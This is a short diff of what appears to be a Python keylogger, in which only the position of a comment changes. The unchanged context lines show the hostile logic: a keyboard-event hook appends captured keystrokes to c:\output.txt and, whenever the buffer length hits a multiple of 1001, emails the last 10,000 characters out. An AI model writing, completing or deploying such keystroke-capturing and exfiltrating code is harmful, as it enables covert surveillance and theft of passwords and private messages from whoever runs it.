@@ -84,7 +84,7 @@ def OnKeyboardEvent(event):
         f=open('c:\output.txt','r+')
         buffer=f.read()
         f.close()
-        
+        #after specific number of characters send email
         if len(buffer)%1001==0:
             #send last 10000 characters
             send_email(buffer[-10000:],email)
@@ -100,7 +100,7 @@ def OnKeyboardEvent(event):
         buffer+=keylogs
         f.write(buffer)
         f.close()
-        #after specific number of charachters send email
+        
         
             
         
